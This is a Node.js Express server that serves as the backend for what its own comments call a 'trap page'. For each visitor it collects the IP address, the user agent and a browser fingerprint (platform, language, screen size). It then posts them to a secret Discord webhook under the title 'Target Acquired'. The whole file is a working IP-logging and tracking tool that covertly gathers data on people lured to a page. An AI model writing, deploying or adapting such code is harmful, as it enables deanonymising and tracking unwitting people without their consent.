// These are the tools our server needs to function.
const express = require('express');
const cors = require('cors');

// This creates our application.
const app = express();
const PORT = process.env.PORT || 10000; // Render will provide the PORT variable.

// --- MIDDLEWARE ---
// This allows our server to accept requests from other domains (like your github.io page).
app.use(cors());
// This allows our server to understand incoming data in JSON format.
app.use(express.json());
// This is important for Render to correctly identify the user's IP address.
app.set('trust proxy', true);


// --- THE MAIN ENDPOINT ---
// Our server will listen for POST requests at the '/submit' path.
app.post('/submit', async (req, res) => {
    
    // 1. Get the secret webhook URL from the environment variables we will set in Render.
    // This is the entire reason we are doing this. The URL is safe here.
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

    if (!WEBHOOK_URL) {
        console.error("FATAL ERROR: Discord Webhook URL is not set in the environment!");
        return res.status(500).json({ message: "Server configuration error." });
    }

    try {
        // 2. Extract the data.
        const ip = req.ip; // Get the user's IP address directly from the request.
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const browserData = req.body; // This is the data from our index.html (screen size, etc.)

        // 3. Build the beautiful embed message.
        const embed = {
            title: "🎯 Target Acquired [Render Proxy V3]",
            color: 3447003, // A nice blue
            timestamp: new Date().toISOString(),
            footer: { text: "Signal processed by Render" },
            fields: [
                { name: "IP Address", value: `\`${ip}\``, inline: true },
                { name: "User Agent", value: `\`${userAgent}\``, inline: false },
                { name: "System Fingerprint", value: `\`Platform: ${browserData.platform} | Lang: ${browserData.language} | Screen: ${browserData.screen}\``, inline: false }
            ]
        };

        // 4. Send the data to Discord using the secret URL.
        const discordResponse = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        // Check if Discord accepted our data.
        if (!discordResponse.ok) {
            console.error("Discord API rejected the webhook post.");
            throw new Error('Discord API error');
        }

        // 5. Send a success message back to the trap page's script.
        res.status(200).json({ message: "Data received successfully." });

    } catch (error) {
        console.error("Error in /submit endpoint:", error);
        res.status(500).json({ message: "Internal server error." });
    }
});

// Start the server and make it listen for connections.
app.listen(PORT, () => {
    console.log(`Server is running and listening on port ${PORT}`);
});
